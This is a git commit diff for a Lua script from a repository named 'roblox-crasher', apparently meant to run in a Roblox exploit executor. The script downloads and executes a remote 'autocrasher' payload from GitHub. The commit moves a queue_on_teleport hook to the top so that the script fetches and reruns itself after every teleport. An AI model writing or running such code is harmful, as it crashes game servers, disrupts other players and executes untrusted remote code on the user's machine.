76247e18c8f9338f8c9c174679776cb74bc6e01e
Korab Arifi <69105206+Korabi-dev@users.noreply.github.com>
2022-07-18 14:57:56 +0200

    Update ah.lua

--- ah.lua
+++ ah.lua
@@ -1,3 +1,8 @@
+local ont = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function()
+    end
+ont("loadstring(game:HttpGet(('https://raw.githubusercontent.com/Korabi-dev/roblox-crasher/main/ah.lua'),true))()")
+
+
 function log(msg, color) 
 if not color then color = "WHITE" end
 rconsoleprint("@@"..color:gsub(" ", "_"):upper().."@@")   
@@ -6,8 +11,5 @@ end
 
 rconsoleclear()
 log("Loading Vecko's crasher....", "red")
+repeat task.wait() until game:FindFirstChild("Workspace"):FindFirstChild("Terrain"):FindFirstChild("_Game")
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/reloxz/endofAH/main/autocrasher.txt'),true))()
-
-local ont = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function()
-    end
-ont("loadstring(game:HttpGet(('https://raw.githubusercontent.com/Korabi-dev/roblox-crasher/main/ah.lua'),true))()")
